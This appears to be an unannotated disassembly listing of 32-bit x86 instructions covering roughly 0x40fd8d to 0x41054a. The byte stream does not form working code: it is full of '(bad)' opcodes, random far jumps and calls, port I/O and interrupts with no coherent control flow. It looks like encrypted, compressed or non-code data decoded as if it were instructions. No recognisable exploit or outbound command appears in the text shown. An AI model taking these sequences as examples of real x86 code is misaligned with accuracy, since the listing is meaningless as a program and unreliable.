  40fd8d:	and    ch,BYTE PTR [ebp+0x5b]
  40fd90:	or     al,BYTE PTR [ebp-0x24]
  40fd93:	das    
  40fd94:	or     al,0x9f
  40fd96:	sahf   
  40fd97:	dec    edx
  40fd98:	push   esi
  40fd99:	stos   DWORD PTR es:[edi],eax
  40fd9a:	test   cl,al
  40fd9c:	xchg   BYTE PTR fs:[ebp+0x5d],al
  40fda0:	or     ah,bl
  40fda2:	shr    BYTE PTR [ebx+edi*8+0x4d385a23],0x9c
  40fdaa:	dec    edx
  40fdab:	jnp    0x40fd80
  40fdad:	into   
  40fdae:	mov    ebp,0xa5a3ca7b
  40fdb3:	imul   eax,DWORD PTR [ebx],0x2b4722ea
  40fdb9:	int    0xca
  40fdbb:	mov    ah,0xda
  40fdbd:	mov    eax,0x92e0564f
  40fdc2:	stos   DWORD PTR es:[edi],eax
  40fdc3:	data16 jle 0x40fd9e
  40fdc6:	push   edi
  40fdc7:	xchg   ebp,eax
  40fdc8:	add    BYTE PTR [edi-0x28],dl
  40fdcb:	das    
  40fdcc:	inc    esi
  40fdcd:	mov    gs,esi
  40fdcf:	(bad)  
  40fdd0:	or     al,0x73
  40fdd2:	jmp    0x49ae:0x3d15ff3f
  40fdd9:	pop    edx
  40fdda:	push   cs
  40fddb:	test   eax,0x96174d50
  40fde0:	mov    bh,0xca
  40fde2:	loop   0x40fd6a
  40fde4:	mov    ch,0xd8
  40fde6:	push   ecx
  40fde7:	out    dx,eax
  40fde8:	add    eax,0xf921ada8
  40fded:	or     al,0x62
  40fdef:	lds    esp,FWORD PTR [esi-0x57d03dee]
  40fdf5:	sub    ebx,ecx
  40fdf7:	dec    eax
  40fdf8:	add    esi,ebp
  40fdfa:	(bad)  
  40fdfb:	mov    ebx,0xacaeee26
  40fe00:	mov    ebx,0x459212aa
  40fe05:	and    DWORD PTR [esi+0x1d],0xa54bee9f
  40fe0c:	push   eax
  40fe0d:	stc    
  40fe0e:	daa    
  40fe0f:	retf   0x1e0
  40fe12:	cs jmp 0x190e:0xc79b7ff7
  40fe1a:	das    
  40fe1b:	mov    al,0x6e
  40fe1d:	lea    ebx,[eax+0xf]
  40fe20:	xor    al,0xe8
  40fe22:	pop    edx
  40fe23:	and    BYTE PTR [esi],al
  40fe25:	dec    ebx
  40fe26:	lds    edi,FWORD PTR [edi]
  40fe28:	sub    eax,0xd4e878aa
  40fe2d:	xor    BYTE PTR [esi-0x50],ch
  40fe30:	pop    es
  40fe31:	mov    bl,0x10
  40fe33:	pop    es
  40fe34:	push   es
  40fe35:	sbb    DWORD PTR [edi+0x30c88cbc],0x6ef248c8
  40fe3f:	or     eax,0x82451789
  40fe44:	xchg   DWORD PTR [ebp+0x49edf0d2],esi
  40fe4a:	jmp    0xb1:0x6647ac57
  40fe51:	xchg   esp,eax
  40fe52:	lock cli 
  40fe54:	cmp    dh,al
  40fe56:	out    dx,al
  40fe57:	xor    cl,BYTE PTR [eax]
  40fe59:	ss dec esi
  40fe5b:	sbb    al,0xcd
  40fe5d:	and    DWORD PTR [ebx+esi*2],0x142063c1
  40fe64:	sub    esp,ebp
  40fe66:	cdq    
  40fe67:	lock ds inc eax
  40fe6a:	mov    al,ds:0x1d4b4bc7
  40fe6f:	jmp    0xd4df:0x48361953
  40fe76:	cmp    BYTE PTR [edi+0x79205a7f],ch
  40fe7c:	cmp    BYTE PTR [ecx-0x6d],bh
  40fe7f:	aam    0xda
  40fe81:	mov    BYTE PTR [ebx+0x540fae3],bl
  40fe87:	push   edx
  40fe88:	mov    bh,0x8d
  40fe8a:	daa    
  40fe8b:	bound  esi,QWORD PTR [ebx+0x552d48b5]
  40fe91:	sbb    bh,BYTE PTR [ebp-0x63]
  40fe94:	xchg   ebx,eax
  40fe95:	cld    
  40fe96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe97:	jno    0x40fe49
  40fe99:	test   al,0x36
  40fe9b:	or     al,0x65
  40fe9d:	jmp    0x1d18:0x2ca54611
  40fea4:	(bad)  
  40fea5:	(bad)
  40fea8:	jmp    0x40fee7
  40feaa:	fnstsw WORD PTR [edx-0x50]
  40fead:	ret    
  40feae:	xor    al,0x91
  40feb0:	stc    
  40feb1:	xchg   esp,eax
  40feb2:	fnstcw WORD PTR [esi]
  40feb4:	xchg   esi,eax
  40feb5:	retf   
  40feb6:	pop    edx
  40feb7:	aas    
  40feb8:	daa    
  40feb9:	std    
  40feba:	add    al,BYTE PTR [eax]
  40febc:	and    bh,BYTE PTR [ecx+0x6f0c30c9]
  40fec2:	retf   
  40fec3:	jno    0x40fec3
  40fec5:	mov    cs,WORD PTR [eax-0x56]
  40fec8:	out    0x17,al
  40feca:	ja     0x40fe6c
  40fecc:	xor    al,0x51
  40fece:	jp     0x40ff31
  40fed0:	and    esi,DWORD PTR [ecx-0x4bb44973]
  40fed6:	dec    esi
  40fed7:	mov    ebp,0x1614f40b
  40fedc:	or     dl,BYTE PTR [ebx+0x374206d9]
  40fee2:	mov    eax,ds:0x872bc819
  40fee7:	inc    ecx
  40fee8:	push   esp
  40fee9:	ins    DWORD PTR es:[edi],dx
  40feea:	in     al,0x77
  40feec:	(bad)  
  40feed:	add    eax,0x4d12de9d
  40fef2:	(bad)  [ebp-0x273162da]
  40fef8:	adc    ch,dl
  40fefa:	idiv   BYTE PTR [ebp-0x3]
  40fefd:	ficom  WORD PTR [eax]
  40feff:	lock ins DWORD PTR es:[edi],dx
  40ff01:	out    0x55,eax
  40ff03:	or     eax,0xf3440ba9
  40ff08:	and    ebp,esi
  40ff0a:	push   cs
  40ff0b:	in     eax,0xfc
  40ff0d:	cmp    al,0x8
  40ff0f:	or     BYTE PTR [ebp+ecx*4+0x2e9b0040],dh
  40ff16:	int3   
  40ff17:	out    dx,eax
  40ff18:	cmp    al,0x31
  40ff1a:	xchg   ebx,eax
  40ff1b:	ss aad 0x6d
  40ff1e:	adc    eax,0x480145da
  40ff23:	mov    edx,DWORD PTR [eax]
  40ff25:	xchg   esi,eax
  40ff26:	push   ebx
  40ff27:	and    ah,al
  40ff29:	adc    eax,0xaa949f47
  40ff2e:	sub    dl,ah
  40ff30:	inc    esp
  40ff31:	pusha  
  40ff32:	(bad)  
  40ff33:	gs push ebp
  40ff35:	sbb    al,0x25
  40ff37:	fs mov dl,0xf3
  40ff3a:	stos   DWORD PTR es:[edi],eax
  40ff3b:	and    eax,0xcbfa56bb
  40ff40:	mov    esp,0x67d1447b
  40ff45:	daa    
  40ff46:	repz aas 
  40ff48:	pop    ebx
  40ff49:	fidiv  WORD PTR [eax]
  40ff4b:	dec    edi
  40ff4d:	cmp    BYTE PTR [edx+ecx*1-0x8],al
  40ff51:	jno    0x40ff81
  40ff53:	mov    DWORD PTR [edi-0x57],ecx
  40ff56:	mov    BYTE PTR [ebx+0x74],ch
  40ff59:	fnstenv [ecx+ebp*8]
  40ff5c:	imul   ebx,DWORD PTR [ecx],0xffffffb3
  40ff5f:	ds xor eax,0x117c3501
  40ff65:	xor    BYTE PTR [ecx-0x35],bl
  40ff68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff69:	rol    bl,cl
  40ff6b:	fs ins DWORD PTR es:[edi],dx
  40ff6d:	cmp    esi,edx
  40ff6f:	int    0x66
  40ff71:	inc    edx
  40ff72:	es xor eax,0xf1ca84ce
  40ff78:	mov    bh,0xd3
  40ff7a:	adc    eax,0x58acc752
  40ff7f:	int    0x46
  40ff81:	data16 arpl ax,si
  40ff84:	push   ebp
  40ff85:	mov    ecx,DWORD PTR [ebx-0x8]
  40ff88:	repz and DWORD PTR [eax+edx*8+0x3628e6b3],edx
  40ff90:	test   al,0x83
  40ff92:	sbb    DWORD PTR [edi-0x23],ecx
  40ff95:	stos   BYTE PTR es:[edi],al
  40ff96:	call   0x1fbb:0xe78f95d4
  40ff9d:	dec    esp
  40ff9e:	cmp    DWORD PTR [ecx],esi
  40ffa0:	or     eax,0x4b6838b4
  40ffa5:	and    DWORD PTR [edi],edi
  40ffa7:	xchg   edi,eax
  40ffa8:	mov    esi,0x4fe05bab
  40ffad:	sub    DWORD PTR [ecx+0x38],eax
  40ffb0:	out    0x6f,eax
  40ffb2:	std    
  40ffb3:	js     0x40ffb0
  40ffb5:	mov    ds:0x8a9bd622,eax
  40ffba:	neg    DWORD PTR [esi-0x56]
  40ffbd:	or     eax,0xd25afb57
  40ffc2:	(bad)  
  40ffc3:	jns    0x40ff5e
  40ffc5:	neg    esp
  40ffc7:	retf   0x2bd8
  40ffca:	mov    ds:0xfbd4329e,eax
  40ffcf:	mov    ebx,0x5d83c410
  40ffd4:	call   0xc7550be0
  40ffd9:	push   eax
  40ffda:	test   BYTE PTR [ebx],al
  40ffdc:	xchg   edi,eax
  40ffdd:	mov    esp,0x8d405813
  40ffe2:	dec    edi
  40ffe3:	jl     0x410025
  40ffe5:	pop    esi
  40ffe6:	add    BYTE PTR [esi-0xb],cl
  40ffe9:	mov    ah,0x3
  40ffeb:	jae    0x40ffcc
  40ffed:	stos   DWORD PTR es:[edi],eax
  40ffee:	adc    al,BYTE PTR [ecx+0x2b]
  40fff1:	xchg   edi,eax
  40fff2:	xchg   edx,eax
  40fff3:	mov    edx,0xc6bc4530
  40fff8:	inc    esi
  40fff9:	repnz xor BYTE PTR [ebx],bl
  40fffc:	in     eax,0xaf
  40fffe:	(bad)  
  40ffff:	mov    DWORD PTR [edi+0x22259609],0x645bcb81
  410009:	or     esp,edi
  41000b:	or     eax,0x78e19c6a
  410010:	push   ebp
  410011:	jae    0x40ff9d
  410013:	in     al,dx
  410014:	not    BYTE PTR [eax]
  410016:	pop    esp
  410017:	mov    DWORD PTR [ecx+ecx*1],ebx
  41001a:	and    BYTE PTR [edx+0x7947155d],ah
  410020:	sbb    DWORD PTR [eax+0x4a2c50b],edi
  410026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410027:	in     eax,0x9
  410029:	xor    eax,0x80f07c57
  41002e:	outs   dx,DWORD PTR ds:[esi]
  41002f:	cli    
  410030:	add    esp,DWORD PTR [esi-0x7a7468c7]
  410036:	push   ebx
  410037:	sub    ch,ah
  410039:	std    
  41003a:	mov    dl,0xa4
  41003c:	sbb    eax,0x579bc5a8
  410041:	fisttp QWORD PTR ds:0xe47a992a
  410047:	call   0xfcef9e4c
  41004c:	sub    eax,0x7b758d3e
  410051:	cld    
  410052:	xchg   ebp,eax
  410053:	bound  edx,QWORD PTR [edx+0x397d0289]
  410059:	mov    BYTE PTR [edx],cl
  41005b:	and    eax,0x2ca913dd
  410060:	jl     0x41005f
  410062:	icebp  
  410063:	mov    ch,0x2b
  410065:	mov    edx,0xd682177b
  41006a:	push   0xffffffb3
  41006c:	jp     0x4100d8
  41006e:	les    esi,FWORD PTR [ecx+0x5775fdc4]
  410074:	jmp    0xcdff8146
  410079:	pop    edi
  41007a:	sahf   
  41007b:	cwde   
  41007c:	mov    ch,0xbf
  41007e:	cmp    al,BYTE PTR [eax+esi*8-0x51]
  410082:	lahf   
  410083:	bound  edi,QWORD PTR [esi]
  410085:	jle    0x4100a5
  410087:	fdivrp st(7),st
  410089:	add    eax,0xb20ef1ba
  41008e:	es pop edi
  410090:	jns    0x4100f1
  410092:	(bad)  
  410093:	shl    DWORD PTR ss:[bx+si-0x1181],cl
  410099:	into   
  41009a:	lahf   
  41009b:	dec    esp
  41009c:	test   DWORD PTR es:[edx+0x38315b80],eax
  4100a3:	pop    ss
  4100a4:	adc    al,0x84
  4100a6:	aaa    
  4100a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100a8:	call   0xd007:0xf28a23f9
  4100af:	push   ebx
  4100b0:	mov    ah,0x4e
  4100b2:	and    DWORD PTR [ebx+edi*2+0x2bfda39c],edi
  4100b9:	dec    eax
  4100ba:	out    0xc3,eax
  4100bc:	push   ss
  4100bd:	xor    BYTE PTR [ebx],0xa8
  4100c0:	fcom   QWORD PTR [ebx]
  4100c2:	sub    DWORD PTR gs:[ebx-0xf],ebx
  4100c6:	std    
  4100c7:	(bad)  
  4100c9:	pop    edx
  4100ca:	cli    
  4100cb:	push   eax
  4100cc:	sub    eax,0x1e011063
  4100d1:	jnp    0x4100d6
  4100d3:	cmp    ah,cl
  4100d5:	jp     0x4100b7
  4100d7:	out    0xd,eax
  4100d9:	pop    esp
  4100da:	test   cl,cl
  4100dc:	addr16 in al,dx
  4100de:	js     0x4100fc
  4100e0:	sub    dh,BYTE PTR [ebx-0x4e]
  4100e3:	xchg   ebp,eax
  4100e4:	retf   0x85df
  4100e7:	sub    eax,0xd720c382
  4100ec:	ins    DWORD PTR es:[edi],dx
  4100ed:	cmp    eax,DWORD PTR [ecx]
  4100ef:	(bad)
  4100f2:	sub    ah,BYTE PTR [esi-0xa]
  4100f5:	imul   esp,DWORD PTR [esi-0x69b7e965],0x3d
  4100fc:	in     eax,dx
  4100fd:	push   cs
  4100fe:	es sub esi,eax
  410101:	call   0xc83a418
  410106:	sbb    BYTE PTR [esp+esi*8+0x5f],ah
  41010a:	push   edx
  41010b:	test   BYTE PTR [ebx+ebx*8],dh
  41010e:	and    DWORD PTR [ebp-0xb],edx
  410111:	mov    esi,0xe75a58f9
  410116:	stos   BYTE PTR es:[edi],al
  410117:	cmp    DWORD PTR [eax],ebp
  410119:	and    BYTE PTR [edx-0x4b],bl
  41011c:	shr    DWORD PTR [ebp+0x67],cl
  41011f:	inc    ebx
  410120:	out    0x5a,eax
  410122:	adc    edx,DWORD PTR [ecx-0x5f]
  410125:	jp     0x4100dd
  410127:	mov    cl,0x81
  410129:	push   ds
  41012a:	inc    edx
  41012b:	retf   0xc05b
  41012e:	jne    0x410179
  410130:	dec    eax
  410131:	stc    
  410132:	mov    eax,ds:0xec932cc7
  410137:	sub    DWORD PTR [ebx-0x6e],edx
  41013a:	lods   eax,DWORD PTR ds:[esi]
  41013b:	nop
  41013c:	hlt    
  41013d:	shl    ah,1
  41013f:	repz sbb bl,BYTE PTR [ecx]
  410142:	lods   eax,DWORD PTR ds:[esi]
  410143:	xchg   esi,eax
  410144:	jg     0x410169
  410146:	push   esi
  410147:	jecxz  0x4101ac
  410149:	pop    ss
  41014a:	inc    ebx
  41014b:	imul   ebp,DWORD PTR [edx+0x37f0339c],0xfccb9631
  410155:	xchg   ebx,eax
  410156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410157:	daa    
  410158:	jno    0x410141
  41015a:	jmp    0x2c42:0xac447323
  410161:	popa   
  410162:	sbb    edi,DWORD PTR [esi+0x28]
  410165:	add    ebp,eax
  410167:	fld    DWORD PTR [ebx-0x47]
  41016a:	ret    0x1b38
  41016d:	je     0x410191
  41016f:	mov    ds:0xf7088380,eax
  410174:	loop   0x41014f
  410176:	js     0x4101b2
  410178:	fcmove st,st(0)
  41017a:	sub    DWORD PTR [eax-0x6c],edi
  41017d:	nop
  41017e:	push   ebp
  41017f:	sbb    DWORD PTR [ecx*2+0x6051b3a],0x62
  410187:	pop    edx
  410188:	add    eax,0x9055832d
  41018d:	inc    ebp
  41018e:	or     eax,0x78cb6e28
  410193:	lock rcr BYTE PTR [esi-0x64],cl
  410197:	test   DWORD PTR [eax+0xd1dd11e],0x5c5511a8
  4101a1:	xchg   ebx,eax
  4101a2:	stos   DWORD PTR es:[edi],eax
  4101a3:	ret    
  4101a4:	aas    
  4101a5:	aas    
  4101a6:	jns    0x410186
  4101a8:	pop    ss
  4101a9:	(bad)  
  4101aa:	test   al,0x67
  4101ac:	cmp    al,0xb1
  4101ae:	enter  0x8ce0,0xc8
  4101b2:	aam    0xf6
  4101b4:	push   es
  4101b5:	in     al,dx
  4101b6:	out    dx,eax
  4101b7:	enter  0xbaab,0xe0
  4101bb:	xchg   esi,eax
  4101bc:	mov    ds:0xf52b7015,al
  4101c1:	cmp    eax,DWORD PTR [edi+0x37]
  4101c4:	std    
  4101c5:	dec    esi
  4101c6:	adc    eax,DWORD PTR [ebx]
  4101c8:	imul   ebp,DWORD PTR [eax],0x27
  4101cb:	std    
  4101cc:	dec    esp
  4101cd:	pop    ecx
  4101ce:	xchg   ebp,eax
  4101cf:	adc    BYTE PTR [edi],al
  4101d1:	ret    0xf296
  4101d4:	scas   al,BYTE PTR es:[edi]
  4101d5:	push   esi
  4101d6:	sbb    DWORD PTR [ecx+ecx*4],edx
  4101d9:	imul   eax,DWORD PTR [ebp-0x10],0xf73775ad
  4101e0:	mov    ah,bl
  4101e2:	fisub  WORD PTR [ebp+0x68]
  4101e5:	sub    ebx,edx
  4101e7:	mov    ds:0x16e5d82f,al
  4101ec:	jmp    0x4077cee9
  4101f1:	push   eax
  4101f2:	sub    bl,BYTE PTR [ecx-0x55]
  4101f5:	inc    esi
  4101f6:	xchg   esi,eax
  4101f7:	push   0xffffffa1
  4101f9:	mov    esi,0xd3fcb3e7
  4101fe:	pop    ecx
  4101ff:	push   edx
  410200:	xchg   edi,eax
  410201:	sub    ebp,DWORD PTR [ebx-0x37]
  410204:	in     eax,dx
  410205:	dec    eax
  410206:	push   ecx
  410207:	test   eax,0x89da6d74
  41020c:	ss xchg esp,eax
  41020e:	stos   BYTE PTR es:[edi],al
  41020f:	(bad)  
  410210:	mov    dl,0xcb
  410212:	add    al,0x6d
  410214:	xor    edi,DWORD PTR [edi]
  410216:	outs   dx,DWORD PTR ds:[esi]
  410217:	xchg   ecx,eax
  410218:	mov    al,ds:0xbf7b404f
  41021d:	or     eax,0x5794a79
  410222:	cmp    al,0x6b
  410224:	inc    eax
  410225:	mov    esi,0x5325babc
  41022a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41022b:	dec    ebp
  41022c:	(bad)  
  41022d:	cmp    al,0x4c
  41022f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410230:	dec    eax
  410231:	xor    BYTE PTR [ecx+0x32225369],bh
  410237:	(bad)  
  410238:	iret   
  410239:	lods   al,BYTE PTR ds:[esi]
  41023a:	ss popf 
  41023c:	push   ebx
  41023d:	push   0xdc3d2ae2
  410242:	pusha  
  410243:	mov    WORD PTR [ecx-0x61b97947],cs
  410249:	or     eax,0x3d06ff33
  41024e:	push   0xd
  410250:	mov    esp,0x6b447515
  410255:	mov    edi,ebx
  410257:	pop    ds
  410258:	xchg   DWORD PTR [esi-0x3e],edi
  41025b:	std    
  41025c:	push   0x3d5f3846
  410261:	push   ds
  410262:	repz jnp 0x410232
  410265:	and    al,BYTE PTR [ebx+0x3d32c7dd]
  41026b:	and    dl,BYTE PTR [ebx]
  41026d:	jp     0x4102a6
  41026f:	(bad)  
  410270:	mov    dl,0x50
  410272:	sub    ebx,ecx
  410274:	mov    bh,0x29
  410276:	or     ebp,DWORD PTR [esi]
  410278:	inc    edx
  410279:	push   edi
  41027a:	adc    al,0x81
  41027c:	mov    ebp,DWORD PTR [ecx]
  41027e:	in     al,0xda
  410280:	sub    esp,esi
  410282:	or     ch,al
  410284:	es aam 0xc0
  410287:	jl     0x41028f
  410289:	xor    ebx,DWORD PTR [edx+0x6bd523c]
  41028f:	fnstsw WORD PTR [ebx+0x52]
  410292:	test   al,0x24
  410294:	cdq    
  410295:	sar    eax,cl
  410297:	push   edx
  410298:	jmp    0x4102b6
  41029a:	lods   al,BYTE PTR ds:[esi]
  41029b:	push   es
  41029c:	pop    ds
  41029d:	mov    ebp,0xb540e2d3
  4102a2:	fild   QWORD PTR [ebp-0x24]
  4102a5:	lahf   
  4102a6:	scas   eax,DWORD PTR es:[edi]
  4102a7:	dec    edx
  4102a8:	jo     0x410234
  4102aa:	jmp    0xb39facb7
  4102af:	push   es
  4102b0:	repz sbb eax,DWORD PTR [edx]
  4102b3:	lods   eax,DWORD PTR ds:[esi]
  4102b4:	mov    bl,0xfd
  4102b6:	call   0xd2000b66
  4102bb:	pop    ecx
  4102bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102bd:	jmp    0x5f4f:0x5a9daba7
  4102c4:	jne    0x41028d
  4102c6:	in     eax,0xdf
  4102c8:	nop
  4102c9:	and    ah,BYTE PTR [edi]
  4102cb:	mov    ebx,0x94bdbba7
  4102d0:	clc    
  4102d1:	xchg   esp,eax
  4102d2:	adc    eax,0x4fec27a5
  4102d7:	ins    DWORD PTR es:[edi],dx
  4102d8:	pop    es
  4102d9:	cmp    eax,0x188bf79a
  4102de:	fidivr WORD PTR [ebx-0x37c3b791]
  4102e4:	sbb    BYTE PTR [ecx],dh
  4102e6:	jnp    0x41034c
  4102e8:	addr16 xchg esi,eax
  4102ea:	nop
  4102eb:	aad    0x66
  4102ed:	fwait
  4102ee:	ror    ch,1
  4102f0:	out    0xce,al
  4102f2:	shl    BYTE PTR [esi-0x4a],cl
  4102f5:	ins    BYTE PTR es:[edi],dx
  4102f6:	loopne 0x4102f8
  4102f8:	dec    edi
  4102f9:	sub    ecx,DWORD PTR [ebx+0x64]
  4102fc:	adc    DWORD PTR [ecx-0x3c],esp
  4102ff:	nop
  410300:	(bad)  
  410301:	test   dl,0xd0
  410304:	fimul  DWORD PTR [edi+0x47]
  410307:	(bad)  
  410308:	jecxz  0x410368
  41030a:	mov    ebx,0x3f5d43e1
  41030f:	xchg   ebx,eax
  410310:	retf   
  410311:	mov    eax,0x680a8fab
  410316:	xchg   edx,eax
  410317:	inc    edx
  410318:	sub    BYTE PTR [ebx-0x3e],ah
  41031b:	mov    ch,0x32
  41031d:	pop    edx
  41031e:	pop    ds
  41031f:	xlat   BYTE PTR ds:[ebx]
  410320:	lock xchg esp,ecx
  410323:	aas    
  410324:	and    al,0xd7
  410326:	jmp    0x54b6c960
  41032b:	and    BYTE PTR [ebx+0x47b0374],ah
  410331:	sub    al,0x38
  410333:	fidivr WORD PTR [edx-0x5ed4ed65]
  410339:	add    DWORD PTR [edi],ebx
  41033b:	(bad)  
  41033c:	jbe    0x410357
  41033e:	ins    DWORD PTR es:[edi],dx
  41033f:	push   eax
  410340:	sub    bh,BYTE PTR [edx+0x50]
  410343:	shl    dl,0xbe
  410346:	mov    fs,WORD PTR [esi-0x61]
  410349:	push   ebp
  41034a:	sub    ebp,ebp
  41034c:	jb     0x41038f
  41034e:	mov    DWORD PTR ds:0x81e023f2,eax
  410354:	xor    WORD PTR [eax],si
  410357:	daa    
  410358:	add    bh,BYTE PTR [edx-0x36]
  41035b:	fwait
  41035c:	push   edi
  41035d:	mov    ds:0x78f6247a,al
  410362:	jo     0x410310
  410364:	xor    esp,ebp
  410366:	push   cs
  410367:	sub    ebp,ecx
  410369:	scas   al,BYTE PTR es:[edi]
  41036a:	prefetchwt1 BYTE PTR [edi]
  41036d:	mov    al,0x6b
  41036f:	mov    ebp,0x7655a53b
  410374:	mov    esi,0x3e236474
  410379:	inc    edi
  41037a:	or     al,0x7
  41037c:	ins    DWORD PTR es:[edi],dx
  41037d:	sar    BYTE PTR [ebx+ecx*8+0x3c437b2b],1
  410384:	cmp    al,0xcc
  410386:	push   ss
  410387:	mov    ebp,0x83038fc
  41038c:	pop    ss
  41038d:	imul   esi,ecx,0xffffff9e
  410390:	xchg   BYTE PTR [esi+0x3e689515],dh
  410396:	sahf   
  410397:	push   ds
  410398:	jmp    0x410391
  41039a:	ret    
  41039b:	xchg   ecx,eax
  41039c:	test   al,0x21
  41039e:	retf   0x5d40
  4103a1:	into   
  4103a2:	jecxz  0x410391
  4103a4:	in     eax,dx
  4103a5:	scas   al,BYTE PTR es:[edi]
  4103a6:	or     bh,ah
  4103a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103a9:	sub    esp,DWORD PTR [eax+edi*4-0x390018f2]
  4103b0:	cli    
  4103b1:	fs inc ecx
  4103b3:	popf   
  4103b4:	mov    ah,0xa2
  4103b6:	sbb    esp,DWORD PTR [eax-0x3a]
  4103b9:	test   edi,eax
  4103bb:	fist   WORD PTR [esi]
  4103bd:	and    eax,0x1d68f9dd
  4103c2:	dec    edx
  4103c3:	xchg   ebx,eax
  4103c4:	push   esp
  4103c5:	aam    0x29
  4103c7:	sar    BYTE PTR [edi-0x15e1f5c5],0x8e
  4103ce:	and    BYTE PTR [esi-0x6c259b25],0xc1
  4103d5:	xchg   ecx,eax
  4103d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103d7:	in     al,dx
  4103d8:	daa    
  4103d9:	test   esi,ecx
  4103db:	push   0xffffffb3
  4103dd:	je     0x410433
  4103df:	pop    edi
  4103e0:	gs push 0x1e
  4103e3:	jae    0x4103c5
  4103e5:	dec    esp
  4103e6:	xchg   esp,eax
  4103e7:	and    edi,esi
  4103e9:	(bad)  
  4103ea:	iret   
  4103eb:	jg     0x4103c3
  4103ed:	vrcpss xmm4,xmm0,DWORD PTR [esi]
  4103f1:	popf   
  4103f2:	pop    ecx
  4103f3:	leave  
  4103f4:	hlt    
  4103f5:	xchg   esi,eax
  4103f6:	jne    0x4103e2
  4103f8:	in     eax,dx
  4103f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103fa:	hlt    
  4103fb:	dec    ebp
  4103fc:	pop    ds
  4103fd:	push   edi
  4103fe:	jbe    0x4103f5
  410400:	ficom  DWORD PTR [ebx+0x3b]
  410403:	gs mov cl,0x63
  410406:	sahf   
  410407:	xchg   esi,eax
  410408:	or     BYTE PTR [ecx+0x63],0x23
  41040c:	xchg   dl,bh
  41040e:	inc    eax
  41040f:	or     eax,0xea14c70f
  410414:	bnd ja 0x4103f6
  410417:	xor    esi,ecx
  410419:	jg     0x4103f6
  41041b:	nop
  41041c:	dec    esi
  41041d:	jl     0x41049c
  41041f:	cmp    DWORD PTR [esi+0x34eb8a13],0x4662b87b
  410429:	cli    
  41042a:	rol    DWORD PTR fs:[esi],1
  41042d:	push   ss
  41042e:	xor    al,0x36
  410430:	int3   
  410431:	xor    esi,DWORD PTR [edi-0x1a]
  410434:	and    ecx,0xffffff89
  410437:	xor    ah,ah
  410439:	adc    BYTE PTR [esi+0x2a],dh
  41043c:	sub    ebx,0xdd4399f5
  410442:	outs   dx,DWORD PTR ds:[esi]
  410443:	cmp    edx,DWORD PTR [eax]
  410445:	clc    
  410446:	out    0xf,eax
  410448:	pop    eax
  410449:	clc    
  41044a:	ds xchg esi,eax
  41044c:	cmp    eax,0xd100ce26
  410451:	sti    
  410452:	enter  0xac6f,0xf7
  410456:	mov    BYTE PTR [edi+0x7c],ch
  410459:	out    0x5d,al
  41045b:	sbb    al,0x42
  41045d:	fs mov ecx,0x12df8b38
  410463:	push   edx
  410464:	jge    0x4103fa
  410466:	mov    al,0x1f
  410468:	out    0xb3,eax
  41046a:	mov    dl,BYTE PTR [esi+0x7f639858]
  410470:	mov    ah,bh
  410472:	(bad)  
  410473:	cdq    
  410474:	push   cs
  410475:	(bad)  
  410477:	push   ecx
  410478:	mov    bh,0xfd
  41047a:	xchg   BYTE PTR [edi],cl
  41047c:	inc    edi
  41047d:	jmp    0xad8d:0x6cb8e339
  410484:	test   DWORD PTR [ebp-0x56],ebp
  410487:	shr    ah,cl
  410489:	(bad)  
  41048a:	jae    0x41047e
  41048c:	xchg   ecx,eax
  41048d:	ret    0x5e46
  410490:	arpl   WORD PTR [ebx+esi*8],di
  410493:	and    edx,eax
  410495:	pop    edi
  410496:	dec    ecx
  410497:	popa   
  410498:	jnp    0x4104d1
  41049a:	sub    eax,edx
  41049c:	ret    0xfb66
  41049f:	cmp    al,0x1e
  4104a1:	inc    esp
  4104a2:	outs   dx,BYTE PTR ds:[esi]
  4104a3:	ret    
  4104a4:	add    al,0x8d
  4104a6:	mov    edi,0xc9876804
  4104ab:	cli    
  4104ac:	jae    0x41044d
  4104ae:	cmp    eax,0xeb29098
  4104b3:	xor    ebx,DWORD PTR [eax]
  4104b5:	retf   0xb2c2
  4104b8:	sub    dl,BYTE PTR [esi-0x1d2bc80d]
  4104be:	push   cs
  4104bf:	mov    esp,0x1e516f6
  4104c4:	jnp    0x410526
  4104c6:	in     eax,0xc9
  4104c8:	sub    eax,0x6cf59a10
  4104cd:	test   DWORD PTR [ecx-0x3e],edi
  4104d0:	pop    ds
  4104d1:	sbb    DWORD PTR [eax+eax*2+0x316b7688],ebp
  4104d8:	xchg   edi,eax
  4104d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104da:	lds    eax,FWORD PTR [ebp+0xf051033]
  4104e0:	cmp    DWORD PTR [edx],edi
  4104e2:	xchg   edi,eax
  4104e3:	popf   
  4104e4:	shr    DWORD PTR [ebp+0x11fd3411],cl
  4104ea:	cld    
  4104eb:	jns    0x41049a
  4104ed:	imul   ebx,DWORD PTR [ecx+0x7c],0x32
  4104f1:	sbb    eax,0x2eea5676
  4104f6:	retf   0x57df
  4104f9:	jo     0x4104c0
  4104fb:	cli    
  4104fc:	push   0xdcfd2a12
  410501:	mov    BYTE PTR [eax-0x5990330a],ah
  410507:	sub    al,BYTE PTR es:[ebp+0x0]
  41050b:	jnp    0x410503
  41050d:	dec    ebp
  41050e:	inc    edx
  41050f:	pusha  
  410510:	inc    esi
  410511:	xchg   esi,eax
  410512:	sbb    dl,BYTE PTR ds:0xb49121bd
  410518:	fdiv   DWORD PTR [ebp-0x1ce6f123]
  41051e:	or     eax,0x14ceea8c
  410523:	loop   0x410513
  410525:	or     eax,0xf429685b
  41052a:	in     eax,dx
  41052b:	pop    ebx
  41052c:	xor    eax,0x983b98a4
  410531:	inc    ecx
  410532:	sbb    ecx,edx
  410534:	out    0x8a,al
  410536:	dec    ecx
  410537:	xchg   ebp,eax
  410538:	jne    0x4104d9
  41053a:	gs push ecx
  41053c:	nop
  41053d:	cmp    ebp,DWORD PTR ds:0x43238a0
  410543:	sub    BYTE PTR ds:0xacf31ad6,ah
  410549:	dec    eax
  41054a:	push   eax
